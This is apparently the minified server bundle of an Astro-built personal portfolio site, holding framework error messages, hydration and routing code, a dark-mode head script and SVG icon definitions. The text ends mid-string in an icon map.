0:o.call(i))??[],remarkPluginFrontmatter:i.frontmatter??{}};throw s}}function jr(e){return typeof e=="object"&&e!=null&&"__astroPropagation"in e}var Le,ya,tt,va,wt,Rn,Ts,xt,jn,St,Ln,$n,zs,Is,Hn,Ms,_n,On,Nn,Ct,Xt,Rs,Et,Aa,Un,Gn,js,qn,D,wa,Ie,nt,fe,A,V,Ks,Rt,kt,Ba,ei,ti,nn,si,ii,ri,li,ci,we,Bt,Jn,Wt,Pa,at,qe,Lt,ot,di,za,Ia,$t,Ma,Ra,Ht,xi,Xn,Fi,ki,ea,ue,Ot,on,Ut,Me,Oi,mt,na,aa,_a,Oa,Ji,oa,Yi,je,Se,oe,Z,$e,Gt,He,qt,ct,Na,st,Ua,er,it,sa,Pt,ar,rr,lr,ca,ua,pa,hr,_e,se,Oe,Vt,Tt,yr,Zt,ha,Ir,Da,Mr,le,W,me,Ne,ut,Ce,Ee,pt,Ja,Ue,Yt,he,ze,Fe,et,dt,Ya,Ge,Qt,lt,It,O=F(()=>{Le=S(N(),1);U();bn();ya=S(G(),1);q();K();tt={name:"ClientAddressNotAvailable",title:"`Astro.clientAddress` is not available in current adapter.",message:e=>`\`Astro.clientAddress\` is not available in the \`${e}\` adapter. File an issue with the adapter to add support.`},va={name:"StaticClientAddressNotAvailable",title:"`Astro.clientAddress` is not available in static mode.",message:"`Astro.clientAddress` is only available when using `output: 'server'` or `output: 'hybrid'`. Update your Astro config if you need SSR features.",hint:"See https://docs.astro.build/en/guides/server-side-rendering/#enabling-ssr-in-your-project for more information on how to enable SSR."},wt={name:"NoMatchingStaticPathFound",title:"No static path found for requested path.",message:e=>`A \`getStaticPaths()\` route pattern was matched, but no matching static path was found for requested path \`${e}\`.`,hint:e=>`Possible dynamic routes being matched: ${e.join(", ")}.`},Rn={name:"OnlyResponseCanBeReturned",title:"Invalid type returned by Astro page.",message:(e,n)=>`Route \`${e||""}\` returned a \`${n}\`. Only a [Response](https://developer.mozilla.org/en-US/docs/Web/API/Response) can be returned from Astro files.`,hint:"See https://docs.astro.build/en/guides/server-side-rendering/#response for more information."},Ts={name:"MissingMediaQueryDirective",title:"Missing value for `client:media` directive.",message:'Media query not provided for `client:media` directive. A media query similar to `client:media="(max-width: 600px)"` must be provided'},xt={name:"NoMatchingRenderer",title:"No matching renderer found.",message:(e,n,a,t)=>`Unable to render \`${e}\`.

${t>0?`There ${a?"are":"is"} ${t} renderer${a?"s":""} configured in your \`astro.config.mjs\` file,
but ${a?"none were":"it was not"} able to server-side render \`${e}\`.`:`No valid renderer was found ${n?`for the \`.${n}\` file extension.`:"for this file extension."}`}`,hint:e=>`Did you mean to enable the ${e} integration?

See https://docs.astro.build/en/core-concepts/framework-components/ for more information on how to install and configure integrations.`},jn={name:"NoClientEntrypoint",title:"No client entrypoint specified in renderer.",message:(e,n,a)=>`\`${e}\` component has a \`client:${n}\` directive, but no client entrypoint was provided by \`${a}\`.`,hint:"See https://docs.astro.build/en/reference/integrations-reference/#addrenderer-option for more information on how to configure your renderer."},St={name:"NoClientOnlyHint",title:"Missing hint on client:only directive.",message:e=>`Unable to render \`${e}\`. When using the \`client:only\` hydration strategy, Astro needs a hint to use the correct renderer.`,hint:e=>`Did you mean to pass \`client:only="${e}"\`? See https://docs.astro.build/en/reference/directives-reference/#clientonly for more information on client:only`},Ln={name:"InvalidGetStaticPathParam",title:"Invalid value returned by a `getStaticPaths` path.",message:e=>`Invalid params given to \`getStaticPaths\` path. Expected an \`object\`, got \`${e}\``,hint:"See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."},$n={name:"InvalidGetStaticPathsReturn",title:"Invalid value returned by getStaticPaths.",message:e=>`Invalid type returned by \`getStaticPaths\`. Expected an \`array\`, got \`${e}\``,hint:"See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."},zs={name:"GetStaticPathsRemovedRSSHelper",title:"getStaticPaths RSS helper is not available anymore.",message:"The RSS helper has been removed from `getStaticPaths`. Try the new @astrojs/rss package instead.",hint:"See https://docs.astro.build/en/guides/rss/ for more information."},Is={name:"GetStaticPathsExpectedParams",title:"Missing params property on `getStaticPaths` route.",message:"Missing or empty required `params` property on `getStaticPaths` route.",hint:"See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."},Hn={name:"GetStaticPathsInvalidRouteParam",title:"Invalid value for `getStaticPaths` route parameter.",message:(e,n,a)=>`Invalid getStaticPaths route parameter for \`${e}\`. Expected undefined, a string or a number, received \`${a}\` (\`${n}\`)`,hint:"See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."},Ms={name:"GetStaticPathsRequired",title:"`getStaticPaths()` function required for dynamic routes.",message:"`getStaticPaths()` function is required for dynamic routes. Make sure that you `export` a `getStaticPaths` function from your dynamic route.",hint:'See https://docs.astro.build/en/core-concepts/routing/#dynamic-routes for more information on dynamic routes.\n\nAlternatively, set `output: "server"` in your Astro config file to switch to a non-static server build. This error can also occur if using `export const prerender = true;`.\nSee https://docs.astro.build/en/guides/server-side-rendering/ for more information on non-static rendering.'},_n={name:"ReservedSlotName",title:"Invalid slot name.",message:e=>`Unable to create a slot named \`${e}\`. \`${e}\` is a reserved slot name. Please update the name of this slot.`},On={name:"InvalidComponentArgs",title:"Invalid component arguments.",message:e=>`Invalid arguments passed to${e?` <${e}>`:""} component.`,hint:"Astro components cannot be rendered directly via function call, such as `Component()` or `{items.map(Component)}`."},Nn={name:"PageNumberParamNotFound",title:"Page number param not found.",message:e=>`[paginate()] page number param \`${e}\` not found in your filepath.`,hint:"Rename your file to `[page].astro` or `[...page].astro`."},Ct={name:"PrerenderDynamicEndpointPathCollide",title:"Prerendered dynamic endpoint has path collision.",message:e=>`Could not render \`${e}\` with an \`undefined\` param as the generated path will collide during prerendering. Prevent passing \`undefined\` as \`params\` for the endpoint's \`getStaticPaths()\` function, or add an additional extension to the endpoint's filename.`,hint:e=>`Rename \`${e}\` to \`${e.replace(/\.(js|ts)/,n=>".json"+n)}\``},Xt={name:"ResponseSentError",title:"Unable to set response.",message:"The response has already been sent to the browser and cannot be altered."},Rs={name:"MiddlewareNoDataOrNextCalled",title:"The middleware didn't return a response or call `next`.",message:"The middleware needs to either return a `Response` object or call the `next` function."},Et={name:"MiddlewareNotAResponse",title:"The middleware returned something that is not a `Response` object.",message:"Any data returned from middleware must be a valid `Response` object."},Aa={name:"LocalsNotAnObject",title:"Value assigned to `locals` is not accepted.",message:"`locals` can only be assigned to an object. Other values like numbers, strings, etc. are not accepted.",hint:"If you tried to remove some information from the `locals` object, try to use `delete` or set the property to `undefined`."},Un={name:"AstroGlobUsedOutside",title:"Astro.glob() used outside of an Astro file.",message:e=>`\`Astro.glob(${e})\` can only be used in \`.astro\` files. \`import.meta.glob(${e})\` can be used instead to achieve a similar result.`,hint:"See Vite's documentation on `import.meta.glob` for more information: https://vitejs.dev/guide/features.html#glob-import"},Gn={name:"AstroGlobNoMatch",title:"Astro.glob() did not match any files.",message:e=>`\`Astro.glob(${e})\` did not return any matching files. Check the pattern for typos.`},js={name:"UnknownContentCollectionError",title:"Unknown Content Collection Error."},qn={name:"CollectionDoesNotExistError",title:"Collection does not exist",message:e=>`The collection **${e}** does not exist. Ensure a collection directory with this name exists.`,hint:"See https://docs.astro.build/en/guides/content-collections/ for more on creating collections."};D=class extends Error{constructor(n,...a){super(...a),this.type="AstroError";let{name:t,title:o,message:s,stack:i,location:l,hint:c,frame:u}=n;this.title=o,this.name=t,s&&(this.message=s),this.stack=i||this.stack,this.loc=l,this.hint=c,this.frame=u}setLocation(n){this.loc=n}setName(n){this.name=n}setMessage(n){this.message=n}setHint(n){this.hint=n}setFrame(n,a){this.frame=$s(n,a)}static is(n){return n.type==="AstroError"}};wa="2.10.3";Ie=Mn,nt=class extends Uint8Array{};Object.defineProperty(nt.prototype,Symbol.toStringTag,{get(){return"HTMLBytes"}});fe=class extends String{get[Symbol.toStringTag](){return"HTMLString"}},A=e=>e instanceof fe?e:typeof e=="string"?new fe(e):e;V={Value:0,JSON:1,RegExp:2,Date:3,Map:4,Set:5,BigInt:6,URL:7,Uint8Array:8,Uint16Array:9,Uint32Array:10};Ks=Object.freeze(["data-astro-transition-scope","data-astro-transition-persist"]);Rt="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY",kt=Rt.length;Ba=Symbol.for("astro.headAndContent");ei='(()=>{var d;{let p={0:t=>t,1:t=>JSON.parse(t,a),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(JSON.parse(t,a)),5:t=>new Set(JSON.parse(t,a)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(JSON.parse(t)),9:t=>new Uint16Array(JSON.parse(t)),10:t=>new Uint32Array(JSON.parse(t))},a=(t,r)=>{if(t===""||!Array.isArray(r))return r;let[s,i]=r;return s in p?p[s](i):void 0};customElements.get("astro-island")||customElements.define("astro-island",(d=class extends HTMLElement{constructor(){super(...arguments);this.hydrate=async()=>{var o;if(!this.hydrator||!this.isConnected)return;let r=(o=this.parentElement)==null?void 0:o.closest("astro-island[ssr]");if(r){r.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let s=this.querySelectorAll("astro-slot"),i={},c=this.querySelectorAll("template[data-astro-template]");for(let e of c){let n=e.closest(this.tagName);n!=null&&n.isSameNode(this)&&(i[e.getAttribute("data-astro-template")||"default"]=e.innerHTML,e.remove())}for(let e of s){let n=e.closest(this.tagName);n!=null&&n.isSameNode(this)&&(i[e.getAttribute("name")||"default"]=e.innerHTML)}let l;try{l=this.hasAttribute("props")?JSON.parse(this.getAttribute("props"),a):{}}catch(e){let n=this.getAttribute("component-url")||"<unknown>",h=this.getAttribute("component-export");throw h&&(n+=` (export ${h})`),console.error(`[hydrate] Error parsing props for component ${n}`,this.getAttribute("props"),e),e}await this.hydrator(this)(this.Component,l,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))}}connectedCallback(){!this.hasAttribute("await-children")||this.firstChild?this.childrenConnectedCallback():new MutationObserver((r,s)=>{s.disconnect(),setTimeout(()=>this.childrenConnectedCallback(),0)}).observe(this,{childList:!0})}async childrenConnectedCallback(){let r=this.getAttribute("before-hydration-url");r&&await import(r),this.start()}start(){let r=JSON.parse(this.getAttribute("opts")),s=this.getAttribute("client");if(Astro[s]===void 0){window.addEventListener(`astro:${s}`,()=>this.start(),{once:!0});return}Astro[s](async()=>{let i=this.getAttribute("renderer-url"),[c,{default:l}]=await Promise.all([import(this.getAttribute("component-url")),i?import(i):()=>()=>{}]),o=this.getAttribute("component-export")||"default";if(!o.includes("."))this.Component=c[o];else{this.Component=c;for(let e of o.split("."))this.Component=this.Component[e]}return this.hydrator=l,this.hydrate},r,this)}attributeChangedCallback(){this.hydrate()}},d.observedAttributes=["props"],d))}})();',ti="<style>astro-island,astro-slot,astro-static-slot{display:contents}</style>";nn=/^(area|base|br|col|command|embed|hr|img|input|keygen|link|meta|param|source|track|wbr)$/i,si=/^(allowfullscreen|async|autofocus|autoplay|controls|default|defer|disabled|disablepictureinpicture|disableremoteplayback|formnovalidate|hidden|loop|nomodule|novalidate|open|playsinline|readonly|required|reversed|scoped|seamless|itemscope)$/i,ii=/^(contenteditable|draggable|spellcheck|value)$/i,ri=/^(autoReverse|externalResourcesRequired|focusable|preserveAlpha)$/i,li=new Set(["set:html","set:text"]),ci=e=>e.trim().replace(/(?:(?!^)\b\w|\s+|[^\w]+)/g,(n,a)=>/[^\w]|\s/.test(n)?"":a===0?n:n.toUpperCase()),we=(e,n=!0)=>n?String(e).replace(/&/g,"&#38;").replace(/"/g,"&#34;"):e,Bt=e=>e.toLowerCase()===e?e:e.replace(/[A-Z]/g,n=>`-${n.toLowerCase()}`),Jn=e=>Object.entries(e).map(([n,a])=>n[0]!=="-"&&n[1]!=="-"?`${Bt(n)}:${a}`:Bt(n)!==n?`${Bt(n)}:var(${n});${n}:${a}`:`${n}:${a}`).join(";");Wt=(e,n,a)=>{let t=JSON.stringify(e.props),o=e.children;return n===a.findIndex(s=>JSON.stringify(s.props)===t&&s.children==o)};Pa=Symbol.for("astro:slot-string"),at=class extends fe{constructor(n,a){super(n),this.instructions=a,this[Pa]=!0}};qe=Symbol.for("astro:fragment"),Lt=Symbol.for("astro:renderer"),ot=new TextEncoder,di=new TextDecoder;Ia=Symbol.for("astro.componentInstance"),$t=class{constructor(n,a,t,o){this[za]=!0,this.result=n,this.props=a,this.factory=o,this.slotValues={};for(let s in t){let i=t[s](n);this.slotValues[s]=()=>i}}async init(n){return this.returnValue!==void 0?this.returnValue:(this.returnValue=this.factory(n,this.props,this.slotValues),this.returnValue)}async render(n){this.returnValue===void 0&&await this.init(this.result);let a=this.returnValue;en(a)&&(a=await a),tn(a)?await a.content.render(n):await xe(n,a)}};za=Ia;Ra=Symbol.for("astro.renderTemplateResult"),Ht=class{constructor(n,a){this[Ma]=!0,this.htmlParts=n,this.error=void 0,this.expressions=a.map(t=>en(t)?Promise.resolve(t).catch(o=>{if(!this.error)throw this.error=o,o}):t)}async render(n){for(let a=0;a<this.htmlParts.length;a++){let t=this.htmlParts[a],o=this.expressions[a];n.write(A(t)),(o||o===0)&&await xe(n,o)}}};Ma=Ra;xi=Symbol.for("astro.needsHeadRendering"),Xn=new Map([["solid","solid-js"]]);Fi=/\<\/?astro-slot\b[^>]*>/g,ki=/\<\/?astro-static-slot\b[^>]*>/g;ea="astro-client-only",ue=class{constructor(n){this.vnode=n,this.count=0}increment(){this.count++}haveNoTried(){return this.count===0}isCompleted(){return this.count>2}};ue.symbol=Symbol("astro:jsx:skip");on=0;Ut=typeof process=="object"&&Object.prototype.toString.call(process)==="[object process]";Oi=Ut?(e,n)=>typeof e=="string"||ArrayBuffer.isView(e)?new Response(e,n):typeof Me>"u"?new(_i())(e,n):new Me(e,n):(e,n)=>new Response(e,n);mt="astro:jsx",na=Symbol("empty"),aa=e=>e;_a=e=>e.trim().replace(/[-_]([a-z])/g,(n,a)=>a.toUpperCase());Oa={check:Ki,renderToStaticMarkup:Vi},Ji=new Date(0),oa="deleted",Yi=Symbol.for("astro.responseSent"),je=class{constructor(n){this.value=n}json(){if(this.value===void 0)throw new Error("Cannot convert undefined to an object.");return JSON.parse(this.value)}number(){return Number(this.value)}boolean(){return this.value==="false"||this.value==="0"?!1:!!this.value}},st=class{constructor(n){k(this,$e);k(this,He);k(this,ct);k(this,Se,void 0);k(this,oe,void 0);k(this,Z,void 0);j(this,Se,n),j(this,oe,null),j(this,Z,null)}delete(n,a){let t={expires:Ji};a?.domain&&(t.domain=a.domain),a?.path&&(t.path=a.path),L(this,He,qt).call(this).set(n,[oa,(0,Le.serialize)(n,oa,t),!1])}get(n){var a;if((a=d(this,Z))!=null&&a.has(n)){let[s,,i]=d(this,Z).get(n);return i?new je(s):new je(void 0)}let o=L(this,$e,Gt).call(this)[n];return new je(o)}has(n){var a;if((a=d(this,Z))!=null&&a.has(n)){let[,,o]=d(this,Z).get(n);return o}return!!L(this,$e,Gt).call(this)[n]}set(n,a,t){let o;if(typeof a=="string")o=a;else{let i=a.toString();i===Object.prototype.toString.call(a)?o=JSON.stringify(a):o=i}let s={};if(t&&Object.assign(s,t),L(this,He,qt).call(this).set(n,[o,(0,Le.serialize)(n,o,s),!0]),d(this,Se)[Yi])throw new D({...Xt})}*headers(){if(d(this,Z)!=null)for(let[,n]of d(this,Z))yield n[1]}};Se=new WeakMap,oe=new WeakMap,Z=new WeakMap,$e=new WeakSet,Gt=function(){return d(this,oe)||L(this,ct,Na).call(this),d(this,oe)||j(this,oe,{}),d(this,oe)},He=new WeakSet,qt=function(){return d(this,Z)||j(this,Z,new Map),d(this,Z)},ct=new WeakSet,Na=function(){let n=d(this,Se).headers.get("cookie");n&&j(this,oe,(0,Le.parse)(n))};Ua=Symbol.for("astro.cookies");er=new Intl.DateTimeFormat([],{hour:"2-digit",minute:"2-digit",second:"2-digit"}),it={debug:20,info:30,warn:40,error:50,silent:90};if(typeof process<"u"){let e=process;"argv"in e&&Array.isArray(e.argv)&&(e.argv.includes("--verbose")||e.argv.includes("--silent"))}Pt=1,ar={write(e){let n=console.error;it[e.level]<it.error&&(n=console.log);function a(){let s="",i=e.type;return i&&(s+=Dn(er.format(new Date)+" "),e.level==="info"?i=Te(vn(`[${i}]`)):e.level==="warn"?i=Te(At(`[${i}]`)):e.level==="error"&&(i=Te(yn(`[${i}]`))),s+=`${i} `),gn(s)}let t=e.message;t===sa?(Pt++,t=`${t} ${At(`(x${Pt})`)}`):(sa=t,Pt=1);let o=a()+t;return n(o),!0}};rr={default(){return new Response(null,{status:301})}},lr={page:()=>Promise.resolve(rr),onRequest:(e,n)=>n(),renderers:[]};ca=Symbol.for("astro.clientAddress"),ua=Symbol.for("astro.locals");pa=Symbol.for("astro.clientAddress"),hr=Symbol.for("astro.responseSent");Vt=class{constructor(n,a,t){k(this,_e,void 0);k(this,se,void 0);k(this,Oe,void 0);if(j(this,_e,n),j(this,se,a),j(this,Oe,t),a)for(let o of Object.keys(a)){if(this[o]!==void 0)throw new D({..._n,message:_n.message(o)});Object.defineProperty(this,o,{get(){return!0},enumerable:!0})}}has(n){return d(this,se)?!!d(this,se)[n]:!1}async render(n,a=[]){if(!d(this,se)||!this.has(n))return;let t=d(this,_e);if(!Array.isArray(a))ye(d(this,Oe),"Astro.slots.render",`Expected second parameter to be an array, received a ${typeof a}. If you're trying to pass an array as a single argument and getting unexpected results, make sure you're passing your array as a item of an array. Ex: Astro.slots.render('default', [["Hello", "World"]])`);else if(a.length>0){let i=d(this,se)[n],l=typeof i=="function"?await i(t):await i,c=fr(l);if(c)return await ke(t,async()=>typeof c=="function"?c(...a):c).then(r=>r!=null?String(r):r);if(typeof l=="function")return await pe(t,l(...a)).then(u=>u!=null?String(u):u)}let o=await ke(t,d(this,se)[n]);return De(t,o)}};_e=new WeakMap,se=new WeakMap,Oe=new WeakMap;Tt=null;yr=["string","number","undefined"];Zt=class{constructor(n,a="production"){this.cache={},this.logging=n,this.mode=a}clearAll(){this.cache={}}set(n,a){var t;this.mode==="production"&&((t=this.cache[n.component])!=null&&t.staticPaths)&&ye(this.logging,"routeCache",`Internal Warning: route cache overwritten. (${n.component})`),this.cache[n.component]=a}get(n){return this.cache[n.component]}};ha=Symbol.for("astro.locals");Ir=Symbol.for("astro.locals"),Da=Symbol.for("astro.responseSent"),Mr=new Set([404,500]),lt=class{constructor(n,a=!0){k(this,pt);k(this,Ue);k(this,he);k(this,Fe);k(this,dt);k(this,Ge);k(this,le,void 0);k(this,W,void 0);k(this,me,void 0);k(this,Ne,void 0);k(this,ut,new TextEncoder);k(this,Ce,{dest:ar,level:"info"});k(this,Ee,void 0);j(this,W,n),j(this,me,{routes:n.routes.map(t=>t.routeData)}),j(this,Ne,new Map(n.routes.map(t=>[t.routeData,t]))),j(this,Ee,Kt(d(this,W).base)),j(this,le,L(this,pt,Ja).call(this,a))}set setManifest(n){j(this,W,n)}set setManifestData(n){j(this,me,n)}removeBase(n){return n.startsWith(d(this,W).base)?n.slice(d(this,Ee).length+1):n}match(n,a={}){let t=new URL(n.url);if(d(this,W).assets.has(t.pathname))return;let o=rt(this.removeBase(t.pathname)),s=ga(o,d(this,me));if(!(!s||s.prerender))return s}async render(n,a,t){if(n.url!==ia(n.url)&&(n=new Request(ia(n.url),n)),a||(a=this.match(n)),!a)return L(this,he,ze).call(this,n,{status:404});Reflect.set(n,Ir,t??{});let o=L(this,dt,Ya).call(this,a.route),s=await L(this,Ge,Qt).call(this,a),i=await s.page(),l=new URL(n.url),c=await L(this,Ue,Yt).call(this,l,n,a,s,o),u;try{u=await ma(a.type,c,d(this,le),i,s.onRequest)}catch(r){return tr(d(this,Ce),"ssr",r.stack||r.message||String(r)),L(this,he,ze).call(this,n,{status:500})}if(Dr(u,a.type))return Mr.has(u.status)?L(this,he,ze).call(this,n,{response:u,status:u.status}):(Reflect.set(u,Da,!0),u);if(u.type==="response")return u.response.headers.get("X-Astro-Response")==="Not-Found"?L(this,he,ze).call(this,n,{response:u.response,status:404}):u.response;{let r=u.body,p=new Headers,m=ya.default.getType(l.pathname);m?p.set("Content-Type",`${m};charset=utf-8`):p.set("Content-Type","text/plain;charset=utf-8");let E=d(this,ut).encode(r);p.set("Content-Length",E.byteLength.toString());let y=new Response(E,{status:200,headers:p});return sn(y,u.cookies),y}}setCookieHeaders(n){return Xi(n)}};le=new WeakMap,W=new WeakMap,me=new WeakMap,Ne=new WeakMap,ut=new WeakMap,Ce=new WeakMap,Ee=new WeakMap,pt=new WeakSet,Ja=function(n=!1){return{adapterName:d(this,W).adapterName,logging:d(this,Ce),markdown:d(this,W).markdown,mode:"production",compressHTML:d(this,W).compressHTML,renderers:d(this,W).renderers,clientDirectives:d(this,W).clientDirectives,resolve:async a=>{if(!(a in d(this,W).entryModules))throw new Error(`Unable to resolve [${a}]`);let t=d(this,W).entryModules[a];switch(!0){case t.startsWith("data:"):case t.length===0:return t;default:return rn(t,d(this,W).base,d(this,W).assetsPrefix)}},routeCache:new Zt(d(this,Ce)),site:d(this,W).site,ssr:!0,streaming:n}},Ue=new WeakSet,Yt=async function(n,a,t,o,s=200){if(t.type==="endpoint"){let i="/"+this.removeBase(n.pathname),c=await o.page();return await fa({request:a,pathname:i,route:t,status:s,env:d(this,le),mod:c})}else{let i=rt(this.removeBase(n.pathname)),l=d(this,Ne).get(t),c=new Set,u=Wr(l.styles),r=new Set;for(let m of l.scripts)"stage"in m?m.stage==="head-inline"&&r.add({props:{},children:m.children}):r.add(Pr(m));let p=await o.page();return await fa({request:a,pathname:i,componentMetadata:d(this,W).componentMetadata,scripts:r,styles:u,links:c,route:t,status:s,mod:p,env:d(this,le)})}},he=new WeakSet,ze=async function(n,{status:a,response:t}){let o=ga("/"+a,d(this,me)),s=new URL(n.url);if(o){if(o.prerender&&!o.route.endsWith(`/${a}`)){let c=new URL(`${d(this,Ee)}/${a}`,s),u=await fetch(c.toString());return L(this,Fe,et).call(this,u,t)}let l=await L(this,Ge,Qt).call(this,o);try{let c=await L(this,Ue,Yt).call(this,s,n,o,l,a),u=await l.page(),r=await ma("page",c,d(this,le),u);return L(this,Fe,et).call(this,r,t)}catch{}}let i=L(this,Fe,et).call(this,new Response(null,{status:a}),t);return Reflect.set(i,Da,!0),i},Fe=new WeakSet,et=function(n,a){if(!a)return n;let{status:t,statusText:o,headers:s}=a;return new Response(n.body,{status:t===200?n.status:t,statusText:t===200?n.statusText:o,headers:new Headers(Array.from(s))})},dt=new WeakSet,Ya=function(n){return n=Kt(n),n.endsWith("/404")?404:n.endsWith("/500")?500:200},Ge=new WeakSet,Qt=async function(n){if(n.type==="redirect")return lr;if(d(this,W).pageMap){let a=d(this,W).pageMap.get(n.component);if(!a)throw new Error(`Unexpectedly unable to find a component instance for route ${n.route}`);return await a()}else{if(d(this,W).pageModule)return d(this,W).pageModule;throw new Error("Astro couldn't find the correct page to render, probably because it wasn't correctly mapped for SSR usage. This is an internal error, please file an issue.")}};It=new Map});var iu,lu,Y,Ae=F(()=>{O();iu=S(N(),1);U();lu=S(G(),1);q();K();Y=[Object.assign({name:"astro:jsx",serverEntrypoint:"astro/jsx/server.js",jsxImportSource:"astro"},{ssr:Oa})]});var ae,Be=F(()=>{ae=void 0});var io={};$(io,{$:()=>H,_:()=>Qr,a:()=>X,b:()=>ee,c:()=>be});var Xa,Lr,$r,eo,Hr,to,_r,Or,H,Nr,no,Ur,ao,Gr,oo,qr,X,Kr,ee,Vr,be,Zr,so,Jr,Yr,Qr,We=F(()=>{O();Xa=Object.freeze,Lr=Object.defineProperty,$r=(e,n)=>Xa(Lr(e,"raw",{value:Xa(n||e.slice())})),Hr=P(),to=B(async(e,n,a)=>{let t=e.createAstro(Hr,n,a);t.self=to;let{title:o="Home: David Arthur [Assan]",description:s="The personal site of David Arthur"}=t.props;return h(eo||(eo=$r([`<meta charset="UTF-8">
<meta name="description" property="og:description"`,`>
<meta name="viewport" content="width=device-width">
<meta name="generator"`,`>
<title>`,`</title>

<link rel="icon" type="image/svg+xml" href="/favicon.svg">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,400;0,700;1,400&family=Rubik:wght@500;600&display=swap" rel="stylesheet">

<script>
  // This code is inlined in the head to make dark mode instant & blocking.
  const getThemePreference = () => {
    if (typeof localStorage !== "undefined" && localStorage.getItem("theme")) {
      return localStorage.getItem("theme");
    }
    return window.matchMedia("(prefers-color-scheme: dark)").matches
      ? "dark"
      : "light";
  };
  const isDark = getThemePreference() === "dark";
  document.documentElement.classList[isDark ? "add" : "remove"]("theme-dark");

  if (typeof localStorage !== "undefined") {
    // Watch the document element and persist user preference when it changes.
    const observer = new MutationObserver(() => {
      const isDark = document.documentElement.classList.contains("theme-dark");
      localStorage.setItem("theme", isDark ? "dark" : "light");
    });
    observer.observe(document.documentElement, {
      attributes: true,
      attributeFilter: ["class"],
    });
  }
<\/script>`])),T(s,"content"),T(t.generator,"content"),o)},"/Users/darth/Desktop/portfolio-website/src/components/MainHead.astro",void 0),_r={"terminal-window":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m80 96 40 32-40 32m56 0h40"/><rect width="192" height="160" x="32" y="48" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16.97" rx="8.5"/>',trophy:'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M56 56v55.1c0 39.7 31.8 72.6 71.5 72.9a72 72 0 0 0 72.5-72V56a8 8 0 0 0-8-8H64a8 8 0 0 0-8 8Zm40 168h64m-32-40v40"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M198.2 128h9.8a32 32 0 0 0 32-32V80a8 8 0 0 0-8-8h-32M58 128H47.9a32 32 0 0 1-32-32V80a8 8 0 0 1 8-8h32"/>',strategy:'<circle cx="68" cy="188" r="28" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m40 72 40 40m0-40-40 40m136 56 40 40m0-40-40 40M136 80V40h40"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m136 40 16 16c40 40 8 88-24 96"/>',"paper-plane-tilt":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M210.3 35.9 23.9 88.4a8 8 0 0 0-1.2 15l85.6 40.5a7.8 7.8 0 0 1 3.8 3.8l40.5 85.6a8 8 0 0 0 15-1.2l52.5-186.4a7.9 7.9 0 0 0-9.8-9.8Zm-99.4 109.2 45.2-45.2"/>',"arrow-right":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M40 128h176m-72-72 72 72-72 72"/>',"arrow-left":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M216 128H40m72-72-72 72 72 72"/>',code:'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m64 88-48 40 48 40m128-80 48 40-48 40M160 40 96 216"/>',"microphone-stage":'<circle cx="168" cy="88" r="64" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="m213.3 133.3-90.6-90.6M100 156l-12 12m16.8-70.1L28.1 202.5a7.9 7.9 0 0 0 .8 10.4l14.2 14.2a7.9 7.9 0 0 0 10.4.8l104.6-76.7"/>',"pencil-line":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M96 216H48a8 8 0 0 1-8-8v-44.7a7.9 7.9 0 0 1 2.3-5.6l120-120a8 8 0 0 1 11.4 0l44.6 44.6a8 8 0 0 1 0 11.4Zm40-152 56 56"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M216 216H96l-55.5-55.5M164 92l-96 96"/>',"rocket-launch":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M94.1 184.6c-11.4 33.9-56.6 33.9-56.6 33.9s0-45.2 33.9-56.6m124.5-56.5L128 173.3 82.7 128l67.9-67.9C176.3 34.4 202 34.7 213 36.3a7.8 7.8 0 0 1 6.7 6.7c1.6 11 1.9 36.7-23.8 62.4Z"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M184.6 116.7v64.6a8 8 0 0 1-2.4 5.6l-32.3 32.4a8 8 0 0 1-13.5-4.1l-8.4-41.9m11.3-101.9H74.7a8 8 0 0 0-5.6 2.4l-32.4 32.3a8 8 0 0 0 4.1 13.5l41.9 8.4"/>',list:'<path stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M40 128h176M40 64h176M40 192h176"/>',heart:'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M128 216S28 160 28 92a52 52 0 0 1 100-20h0a52 52 0 0 1 100 20c0 68-100 124-100 124Z"/>',"moon-stars":'<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M216 112V64m24 24h-48m-24-64v32m16-16h-32m65 113A92 92 0 0 1 103 39h0a92 92 0 1 0 114 114Z"/>',sun:'<circle cx="128" cy="128" r="60" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"/><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="16" d="M128 36V16M63 63 49 49m-13 79H16m47 65-14 14m79 13v20m65-47 14 14m13-79h20m-47-65 14-14"/>',"twitter-logo":'<path fill="none" stroke-linecap="round" 